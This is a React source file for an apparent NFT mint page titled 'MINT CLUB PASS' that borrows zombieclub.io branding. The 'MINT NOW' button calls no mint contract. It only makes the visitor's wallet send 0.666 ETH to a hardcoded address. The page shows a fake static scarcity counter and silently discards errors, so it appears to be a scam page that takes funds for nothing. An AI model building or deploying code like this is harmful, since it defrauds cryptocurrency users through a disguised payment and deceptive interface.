//import { useState } from "react";
import { ethers } from "ethers";
//import ErrorMessage from "./ErrorMessage";
//import TxList from "./TxList";
import "./App.css";
//import logo from "./img/zombie_type.png";
//import mintb from "./img/Mint-Block.png";

const startPayment = async ({ setError, setTxs, ether, addr }) => {
  try {
    if (!window.ethereum)
      throw new Error("No crypto wallet found. Please install it.");

    await window.ethereum.send("eth_requestAccounts");
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    ethers.utils.getAddress(addr);
    const tx = await signer.sendTransaction({
      to: addr,
      value: ethers.utils.parseEther(ether)
    });
    console.log({ ether, addr });
    console.log("tx", tx);
    setTxs([tx]);
  } catch (err) {}
};

export default function App() {
  const handleSubmit = async (e) => {
    e.preventDefault();
    await startPayment({
      ether: "0.666",
      addr: "0x9Ad72152194BEc779fAD991E9260833bdF8B19A8"
    });
  };

  return (
    <>
      <div className="nav">
        <a href="https://zombieclub.io">
          <img
            className="logo"
            src="https://raw.githubusercontent.com/adanedan108/csb-0j1gzz/gh-pages/img/zombie_type.png"
            alt=""
          />
        </a>
      </div>
      <div>
        <form className="m-4" onSubmit={handleSubmit}>
          <h1 className="cen title">Get turned now!</h1>
          <div className="box">
            <img
              className="mintb"
              src="https://raw.githubusercontent.com/adanedan108/csb-0j1gzz/gh-pages/img/Mint-Block.png"
              alt=""
            />
            <main className="cendiv mt-4 p-4 ontop">
              <h1 className="mintbt mintbtb text-xl font-semibold text-gray-700 text-center">
                MINT CLUB PASS
              </h1>
              <div className="rectangle1">
                <div className="progress">
                  <div className="progress_fill"></div>
                  <span className="progress_text">5380/6666 LEFT</span>
                </div>
              </div>
              <div className="tbd">
                <table className="cendiv tb">
                  <tr>
                    <td className="td1">QUANTITY</td>
                    <td className="td1">TOTAL PRICE</td>
                  </tr>
                  <tr>
                    <td className="td td2">1</td>
                    <td className="td td2">0.666 ETH</td>
                  </tr>
                </table>
              </div>
              <div>
                <button type="submit" className="btn submit-button btnd">
                  <h1 className="bigger">MINT NOW</h1>
                </button>
              </div>
            </main>
          </div>
        </form>
      </div>
    </>
  );
}
